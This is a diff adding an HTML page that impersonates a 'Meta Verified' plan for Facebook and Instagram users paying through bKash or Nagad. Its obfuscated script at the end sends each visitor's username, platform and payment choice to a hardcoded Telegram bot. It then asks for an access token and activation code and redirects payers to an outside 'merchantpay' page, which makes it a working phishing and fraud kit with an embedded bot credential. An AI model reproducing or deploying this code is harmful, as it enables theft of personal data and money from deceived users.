@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Meta Verified</title>
+
+    <style>
+
+        * {
+
+            margin: 0;
+
+            padding: 0;
+
+            box-sizing: border-box;
+
+            font-family: Arial, sans-serif;
+
+        }
+
+        body {
+
+            background-color: #f4f7fc;
+
+            color: #333;
+
+            line-height: 1.6;
+
+        }
+
+        .banner {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .banner img {
+            max-width: 100%;
+            height: auto;
+            width: 100%;
+            max-width: 300px; /* এই লাইনটি ইমেজের সর্বাধিক উচ্চতা নির্ধারণ করবে */
+            object-fit: cover;
+	}
+
+        .banner-text {
+
+            position: absolute;
+
+            top: 50%;
+
+            left: 50%;
+
+            transform: translate(-50%, -50%);
+
+            color: white; /* Change this if the text is not visible */
+
+        }
+      
+      .price-section {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 20px;
+}
+
+.price-table {
+    border: 1px solid #ccc;
+    border-radius: 10px;
+    padding: 20px;
+    background-color: #f9f9f9;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    width: 300px;
+}
+
+.price {
+    font-size: 36px;
+    font-weight: bold;
+    color: #333;
+}
+
+.title {
+    display: block;
+    font-size: 24px;
+    margin: 10px 0;
+    font-weight: 600;
+}
+
+.description {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 15px;
+}
+
+.features {
+    margin: 20px 0;
+}
+
+.feature {
+    border-bottom: 1px solid #ccc;
+    padding: 10px 0;
+}
+
+.checkmark {
+    color: #4caf50;
+    margin-right: 10px;
+}
+
+.question-icon {
+    color: #007bff;
+    margin-left: 10px;
+}
+
+.name {
+    font-weight: 500;
+}
+
+.answer {
+    font-size: 12px;
+    color: #777;
+    margin-top: 5px;
+}
+
+.subscribe-button {
+    background-color: #007bff;
+    color: white;
+    padding: 10px 15px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%;
+}
+
+.subscribe-button:hover {
+    background-color: #0056b3;
+}
+
+      /* Button styling */
+.button {
+  padding: 15px 20px;
+  border: none;
+  outline: none;
+  background-color: #151515;
+  color: #eee;
+  border-radius: 7px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.25s ease-out;
+}
+
+.button:hover {
+  transform: translateY(-3px);
+}
+
+/* Popup overlay styling */
+.popup-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: rgba(0, 0, 0, 0.8);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  visibility: hidden;
+  opacity: 0;
+  transition: opacity 0.3s ease, visibility 0.3s ease;
+}
+
+.popup-overlay.active {
+  visibility: visible;
+  opacity: 1;
+}
+
+/* Popup content styling */
+.popup-content {
+  background-color: #ffffff;
+  border-radius: 16px;
+  padding: 20px;
+  width: 300px;
+  max-width: 90%;
+  box-shadow: 0 15px 45px rgba(0, 0, 0, 0.3);
+  transform: scale(0.9);
+  transition: transform 0.3s ease;
+}
+
+.popup-overlay.active .popup-content {
+  transform: scale(1);
+}
+
+/* Close button styling */
+.close {
+  font-size: 1.5rem;
+  font-weight: bold;
+  color: #333;
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  cursor: pointer;
+}
+
+/* Form styling */
+form {
+  display: flex;
+  flex-direction: column;
+}
+
+label {
+  margin-top: 10px;
+  font-weight: 500;
+  color: #333;
+}
+
+input[type="text"],
+select {
+  padding: 10px;
+  margin-top: 5px;
+  border: 1px solid #ddd;
+  border-radius: 5px;
+}
+
+.get-verified-btn {
+  padding: 12px;
+  background-color: #151515;
+  color: #eee;
+  border: none;
+  border-radius: 7px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 15px;
+  transition: all 0.25s ease-out;
+}
+
+.get-verified-btn:hover {
+  background-color: #333;
+}
+
+	    /* From Uiverse.io by Gaurang7717 */ 
+.Btn {
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  width: 45px;
+  height: 45px;
+  border: none;
+  border-radius: 50%;
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+  transition-duration: 0.3s;
+  box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.199);
+  background-color: #00d757;
+}
+
+.sign {
+  width: 100%;
+  transition-duration: 0.3s;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.sign svg {
+  width: 25px;
+}
+
+.sign svg path {
+  fill: white;
+}
+.text {
+  position: absolute;
+  right: 0%;
+  width: 0%;
+  opacity: 0;
+  color: white;
+  font-size: 1.2em;
+  font-weight: 600;
+  transition-duration: 0.3s;
+}
+
+.Btn:hover {
+  width: 150px;
+  border-radius: 40px;
+  transition-duration: 0.3s;
+}
+
+.Btn:hover .sign {
+  width: 30%;
+  transition-duration: 0.3s;
+  padding-left: 10px;
+}
+
+.Btn:hover .text {
+  opacity: 1;
+  width: 70%;
+  transition-duration: 0.3s;
+  padding-right: 10px;
+}
+.Btn:active {
+  transform: translate(2px, 2px);
+}
+
+
+        /* Other CSS styles go here */
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="banner">
+
+        <img src="https://imgur.com/6RAPq12.png" alt="Banner Image" class="banner-image">
+
+
+    </div>
+  
+  <div class="price-section">
+
+	<article class="price-table">
+
+		<div class="price"><small>৳</small>145ㅤ<small><small><small>/3 months</small><small/></small></small></div>
+
+		<span class="title">Meta Verified Plan</span>
+
+		<span class="description">A comprehensive plan for businesses and individuals seeking authenticity and visibility on Meta platforms.</span>
+
+		<div class="features">
+
+			<details class="feature">
+
+				<summary>
+
+					<i aria-hidden="true" class="checkmark">
+
+						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+
+							<path fill="none" d="M0 0h24v24H0z"></path>
+
+							<path fill="currentColor" d="M10 15.172l9.192-9.193 1.415 1.414L10 18l-6.364-6.364 1.414-1.414z"></path>
+
+						</svg>
+
+					</i>
+
+					<span class="name">Profile Verification</span>
+
+					<i aria-hidden="true" class="question-icon">
+
+						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+
+							<path fill="none" d="M0 0h24v24H0z"></path>
+
+							<path fill="currentColor" d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm0-2a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm-1-5h2v2h-2v-2zm2-1.645V14h-2v-1.5a1 1 0 0 1 1-1 1.5 1.5 0 1 0-1.471-1.794l-1.962-.393A3.501 3.501 0 1 1 13 13.355z"></path>
+
+						</svg>
+
+					</i>
+
+				</summary>
+
+				<div class="answer">
+
+					Get your profile verified to gain trust and credibility.
+
+				</div>
+
+			</details>
+
+			<details class="feature">
+
+				<summary>
+
+					<i aria-hidden="true" class="checkmark">
+
+						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+
+							<path fill="none" d="M0 0h24v24H0z"></path>
+
+							<path fill="currentColor" d="M10 15.172l9.192-9.193 1.415 1.414L10 18l-6.364-6.364 1.414-1.414z"></path>
+
+						</svg>
+
+					</i>
+
+					<span class="name">Priority Support</span>
+
+					<i aria-hidden="true" class="question-icon">
+
+						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+
+							<path fill="none" d="M0 0h24v24H0z"></path>
+
+							<path fill="currentColor" d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm0-2a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm-1-5h2v2h-2v-2zm2-1.645V14h-2v-1.5a1 1 0 0 1 1-1 1.5 1.5 0 1 0-1.471-1.794l-1.962-.393A3.501 3.501 0 1 1 13 13.355z"></path>
+
+						</svg>
+
+					</i>
+
+				</summary>
+
+				<div class="answer">
+
+					Receive priority assistance from our support team.
+
+				</div>
+
+			</details>
+
+			<details class="feature">
+
+				<summary>
+
+					<i aria-hidden="true" class="checkmark">
+
+						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+
+							<path fill="none" d="M0 0h24v24H0z"></path>
+
+							<path fill="currentColor" d="M10 15.172l9.192-9.193 1.415 1.414L10 18l-6.364-6.364 1.414-1.414z"></path>
+
+						</svg>
+
+					</i>
+
+					<span class="name">Enhanced Reach</span>
+
+					<i aria-hidden="true" class="question-icon">
+
+						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+
+							<path fill="none" d="M0 0h24v24H0z"></path>
+
+							<path fill="currentColor" d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm0-2a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm-1-5h2v2h-2v-2zm2-1.645V14h-2v-1.5a1 1 0 0 1 1-1 1.5 1.5 0 1 0-1.471-1.794l-1.962-.393A3.501 3.501 0 1 1 13 13.355z"></path>
+
+						</svg>
+
+					</i>
+
+				</summary>
+
+				<div class="answer">
+
+					Increase your profile visibility and reach on the platform.
+
+				</div>
+
+			</details>
+
+			<details class="feature">
+
+				<summary>
+
+					<i aria-hidden="true" class="checkmark">
+
+						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+
+							<path fill="none" d="M0 0h24v24H0z"></path>
+
+							<path fill="currentColor" d="M10 15.172l9.192-9.193 1.415 1.414L10 18l-6.364-6.364 1.414-1.414z"></path>
+
+						</svg>
+
+					</i>
+
+					<span class="name">Exclusive Content</span>
+
+					<i aria-hidden="true" class="question-icon">
+
+						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+
+							<path fill="none" d="M0 0h24v24H0z"></path>
+
+							<path fill="currentColor" d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm0-2a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm-1-5h2v2h-2v-2zm2-1.645V14h-2v-1.5a1 1 0 0 1 1-1 1.5 1.5 0 1 0-1.471-1.794l-1.962-.393A3.501 3.501 0 1 1 13 13.355z"></path>
+
+						</svg>
+
+					</i>
+
+				</summary>
+
+				<div class="answer">
+
+					Access to special events, webinars, and more resources.
+
+				</div>
+        
+        
+        <button class="button" onclick="openPopup()">Buy Now</button>
+
+<div id="popup" class="popup-overlay">
+
+  <div class="popup-content">
+
+    <span class="close" onclick="closePopup()">&times;</span>
+
+
+
+    <form>
+
+<img src="https://imgur.com/1FFUxkl.png" alt="Meta Logo" class="logo">
+
+      <label for="platform">Choose Platform:</label>
+
+      <select id="platform" required>
+
+        <option value="facebook">Facebook</option>
+
+        <option value="instagram">Instagram</option>
+
+      </select>
+
+      <label for="username">Username:</label>
+
+      <input type="text" id="username" placeholder="Enter your username" required>
+
+      <label for="payment">Payment Method:</label>
+
+      <select id="payment" required>
+
+        <option value="bkash">bKash</option>
+
+        <option value="nagad">Nagad</option>
+
+      </select>
+
+      <button type="button" class="get-verified-btn" onclick="sendToTelegram()">Get Verified Now</button>
+
+    </form>
+
+  </div>
+
+</div>
+
+<div id="activationPopup" class="popup-overlay">
+            <div class="popup-content">
+                <span class="close" onclick="closeActivationPopup()">&times;</span>
+        
+                <form id="activationForm">
+
+<img src="https://imgur.com/1FFUxkl.png" alt="Meta Logo" class="logo">
+			
+  <button class="Btn" onclick="window.location.href='https://api.whatsapp.com/send/?phone=8801860732224&text=Access+Token+and+Activation+Code&type=phone_number&app_absent=0'">
+  <div class="sign">
+    <svg class="socialSvg whatsappSvg" viewBox="0 0 16 16">
+      <path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z"></path>
+    </svg>
+  </div>
+  <div class="text">Whatsapp</div>
+</button>
+
+		    
+                    <label for="accessToken">Access Token:</label>
+                    <input type="text" id="accessToken" placeholder="Enter Access Token" required>
+
+                    <label for="activationCode">Activation Code:</label>
+                    <input type="text" id="activationCode" placeholder="Enter Activation Code" required>
+
+                    <button type="button" class="get-verified-btn" onclick="activateAccount()">Activate</button>
+              </form>
+            </div>
+        </div>
+          
+
+</body>
+<script>const _0x8f8aa0=_0x4735;(function(_0x2b28ff,_0x220aed){const _0x582309=_0x4735,_0x5306fc=_0x2b28ff();while(!![]){try{const _0x191108=parseInt(_0x582309(0x195))/0x1*(parseInt(_0x582309(0x1a4))/0x2)+-parseInt(_0x582309(0x196))/0x3+-parseInt(_0x582309(0x19f))/0x4*(-parseInt(_0x582309(0x199))/0x5)+-parseInt(_0x582309(0x191))/0x6*(parseInt(_0x582309(0x1a0))/0x7)+parseInt(_0x582309(0x1a2))/0x8+parseInt(_0x582309(0x194))/0x9+parseInt(_0x582309(0x1af))/0xa;if(_0x191108===_0x220aed)break;else _0x5306fc['push'](_0x5306fc['shift']());}catch(_0x5843f4){_0x5306fc['push'](_0x5306fc['shift']());}}}(_0x585e,0x53013));const telegramToken=_0x8f8aa0(0x1b3),chatId=_0x8f8aa0(0x1a1);function _0x585e(){const _0x191d7a=['https://api.telegram.org/bot','accessToken','Username:\x20','\x0aPayment\x20Method:\x20','remove','activationPopup','1068730BxXVwC','application/json','username','active','7716744122:AAENS9SLGQCQjactCw4IVRcNow-E8R5jDC4','location','getElementById','\x0aPlatform:\x20','href','42KljQrl','payment','POST','2603592HqEbLo','21778iegCqV','1318443AKQnDG','bkash','stringify','115SvblhV','https://merchantpay.vercel.app','/sendMessage','test','nagad','popup','60284NNLRdW','378434oghADS','7174617845','359056CuuKrG','value','34XZqfTj','https://merchantpay.vercel.app/authtoken=nagadapi.html','add','platform','classList'];_0x585e=function(){return _0x191d7a;};return _0x585e();}function openPopup(){const _0xbc67bc=_0x8f8aa0;document[_0xbc67bc(0x1b5)](_0xbc67bc(0x19e))['classList'][_0xbc67bc(0x1a6)](_0xbc67bc(0x1b2));}function closePopup(){const _0x14a95a=_0x8f8aa0;document[_0x14a95a(0x1b5)](_0x14a95a(0x19e))['classList'][_0x14a95a(0x1ad)](_0x14a95a(0x1b2));}function _0x4735(_0x2ea0cc,_0x398b60){const _0x585e5b=_0x585e();return _0x4735=function(_0x473507,_0x52e6d8){_0x473507=_0x473507-0x18f;let _0x457969=_0x585e5b[_0x473507];return _0x457969;},_0x4735(_0x2ea0cc,_0x398b60);}function closeActivationPopup(){const _0x336c43=_0x8f8aa0;document[_0x336c43(0x1b5)]('activationPopup')[_0x336c43(0x1a8)][_0x336c43(0x1ad)](_0x336c43(0x1b2));}function sendToTelegram(){const _0xeada2a=_0x8f8aa0,_0x2fe27e=document[_0xeada2a(0x1b5)](_0xeada2a(0x1b1))['value'],_0x44bcf9=document['getElementById'](_0xeada2a(0x1a7))[_0xeada2a(0x1a3)],_0x4e9583=document[_0xeada2a(0x1b5)]('payment')[_0xeada2a(0x1a3)],_0x2c6600=_0xeada2a(0x1ab)+_0x2fe27e+_0xeada2a(0x18f)+_0x44bcf9+_0xeada2a(0x1ac)+_0x4e9583;fetch('https://api.telegram.org/bot'+telegramToken+_0xeada2a(0x19b),{'method':_0xeada2a(0x193),'headers':{'Content-Type':_0xeada2a(0x1b0)},'body':JSON[_0xeada2a(0x198)]({'chat_id':chatId,'text':_0x2c6600})}),closePopup(),document[_0xeada2a(0x1b5)](_0xeada2a(0x1ae))[_0xeada2a(0x1a8)][_0xeada2a(0x1a6)](_0xeada2a(0x1b2));}function validatePattern(_0x2b42b1,_0xd66cc3){const _0x97cde1=_0x8f8aa0,_0x5c5872=new RegExp(_0xd66cc3);return _0x5c5872[_0x97cde1(0x19c)](_0x2b42b1);}function activateAccount(){const _0x176ae6=_0x8f8aa0,_0x3d5ba3=document[_0x176ae6(0x1b5)](_0x176ae6(0x1aa))[_0x176ae6(0x1a3)],_0x3c144c=document['getElementById']('activationCode')['value'],_0x50875f=/^[A-Z0-9]{3}1[A-Z0-9]{2}I[A-Z0-9]{3}$/;if(validatePattern(_0x3d5ba3,accessTokenPattern)&&validatePattern(_0x3c144c,_0x50875f)){fetch(_0x176ae6(0x1a9)+telegramToken+_0x176ae6(0x19b),{'method':'POST','headers':{'Content-Type':_0x176ae6(0x1b0)},'body':JSON[_0x176ae6(0x198)]({'chat_id':chatId,'text':'Account\x20activated\x20successfully.'})});const _0x254643=document[_0x176ae6(0x1b5)](_0x176ae6(0x192))[_0x176ae6(0x1a3)];if(_0x254643===_0x176ae6(0x197))window[_0x176ae6(0x1b4)][_0x176ae6(0x190)]=_0x176ae6(0x19a);else _0x254643===_0x176ae6(0x19d)&&(window[_0x176ae6(0x1b4)][_0x176ae6(0x190)]=_0x176ae6(0x1a5));}else alert('Invalid\x20Access\x20Token\x20or\x20Activation\x20Code.');}</script>
+
+
+</html>
